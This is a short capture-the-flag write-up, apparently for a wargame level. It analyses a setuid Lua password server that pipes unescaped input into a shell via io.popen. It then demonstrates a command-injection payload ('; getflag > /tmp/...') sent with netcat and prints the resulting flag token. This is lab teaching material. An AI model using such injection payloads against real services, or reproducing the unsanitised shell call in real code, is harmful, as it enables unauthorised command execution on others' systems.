# level11 solution
Given lua setuid script:

    #!/usr/bin/env lua
    local socket = require("socket")
    local server = assert(socket.bind("127.0.0.1", 5151))

    function hash(pass)
    prog = io.popen("echo "..pass.." | sha1sum", "r")
    data = prog:read("*all")
    prog:close()

    data = string.sub(data, 1, 40)

    return data
    end


    while 1 do
    local client = server:accept()
    client:send("Password: ")
    client:settimeout(60)
    local l, err = client:receive()
    if not err then
        print("trying " .. l)
        local h = hash(l)

        if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
            client:send("Erf nope..\n");
        else
            client:send("Gz you dumb*\n")
        end

    end

    client:close()
    end

Chck if it's running with netstat:

    netstat -tuln
    tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN

Connect with netcat and provide some password to see how it's working:

    nc localhost 5151
    Password: pass
    Erf nope..

Hash generates by launching shell subprocess and providing password to to echo which pipes in sha1sum. Provided password does not protected from injection, we can abuse that and insert any command:

    nc localhost 5151
    Password: ;getflag > /tmp/level11_token
    Erf nope..
    cat /tmp/level11_token
    Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
